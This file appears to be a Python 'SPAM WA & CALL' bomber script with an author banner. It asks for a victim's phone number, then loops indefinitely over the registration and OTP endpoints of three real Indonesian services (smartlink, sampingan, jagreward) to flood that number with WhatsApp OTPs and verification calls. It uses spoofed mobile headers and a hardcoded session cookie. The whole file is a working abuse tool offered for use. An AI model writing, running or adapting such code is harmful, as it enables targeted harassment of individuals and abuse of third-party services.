import os,sys,time,requests,random,json,re
from requests import post                            
from time import sleep

def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r\033[1;97m[\033[1;96m•\033[1;97m]Waiting\033[90m...\033[1;97m{mins:02d}:{secs:02d}', end='', flush=True)
        time.sleep(1)
        total_second -= 1
def wa():
    ua={
    "Host": "bos.smartlink.id",                             
    "Connection": "keep-alive",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://bos.smartlink.id",
    "Referer": "https://bos.smartlink.id/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "laravel_session=eyJpdiI6IllaMDVxOEh0WGFtdEVnR1JWWE5NMGc9PSIsInZhbHVlIjoiUFAzWUZnTDJ4Q3pKM3R1U1k4VE1yV1oxZ1wvOThkQThQaVFJSlBrWnRqd0hHZFJidjhoMXlcL3lMd2VmTmlYWVdCIiwibWFjIjoiZGE4NjZkMjU2MWE4MzJiYzQ3MWI4Y2FkMDRiNzBmYWQzYTliYzgwYzY3MTg3MDc5Njc4YjgxMzVhYWZhNDFkNyJ9"
    }
    t=requests.get("https://bos.smartlink.id/register").text
    token=re.findall(r"name=\"_token\" value=\"(.*?)\"",t)[0]
    dat={
    "idkaryawan":"",
    "_token":token,
    "multiowner":"false",
    "tiperegister":"telp",
    "nama":"Famztxt",
    "email":"",
    "country_code":"62",
    "nohp":"",
    "telp":no,
    "password":"tes1234",
    "ulangi_password":"tes1234",
    "kota":"3201",
    "kode_afiliator":"",
    "resultOTP":"",
    "whitelistid":"",
    "otpvia":"wa",
    "syarat_ketentuan":"on",
    "otp":""
    }
    r=requests.post("https://bos.smartlink.id/checkRegister", data=dat, headers=ua).text
    if "OTP Terkirim" in r:
        print (f"\033[1;97m[\033[1;92m+\033[1;97m]Spam To \033[90m-\033[1;94m{no}\033[90m- \033[1;92mSuccess\033[1;97m[\033[1;92m+\033[1;97m]")
    else:
        sys.exit("\033[1;97m[\033[1;91m×\033[1;97m]\033[1;91mLimit Bro\033[00m")
def cal1():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":no})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
    if "Nomor tidak valid, cek kembali pengisian nomor anda" in r.text:
        sys.exit("\033[1;97m[\033[1;91m×\033[1;97m]\033[1;91mLimit Bro\033[00m")
    else:
        print (f"\033[1;97m[\033[1;92m+\033[1;97m]Spam To \033[90m-\033[1;94m{no}\033[90m- \033[1;92mSuccess\033[1;97m[\033[1;92m+\033[1;97m]")
def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+no+"/", headers=head)
    print
banner="""
        \033[1;97m SPAM WA & CALL
        \33[90m --------------
\033[1;97m[\033[1;96m!\033[1;97m]AUTHOR :\033[1;96mFAHMIAPZ
\033[1;97m[\033[1;96m!\033[1;97m]YOUTUBE:\033[1;96mAPMZCHANNEL
\033[1;97m[\033[1;96m!\033[1;97m]GITHUB :\033[4;92mgithub.com/BangDanz\033[00m
_____________________________________"""
if __name__ == '__main__':
    os.system("clear")
    print (banner)
    print ("      \033[90m -\033[1;91mX\033[90m- \033[1;97mCtrl+z to exit \033[90m-\033[1;91mX\033[90m-")
    no=input("\033[1;97m[\033[1;96m•\033[1;97m]No Target\033[90m(\033[1;94m8×××\033[90m)\033[1;97m:\033[1;94m ")
    while True:
        try:
            call()
            sleep(2)
            wa()
            sleep(3)
            cal1()
            sleep(2)
            countdownTimer(2, 00)
            print("\n")
        except requests.exceptions.ConnectionError:
               sys.exit("\033[1;97m[\033[1;91m×\033[1;97m\033[1;91mKoneksi Error!!")
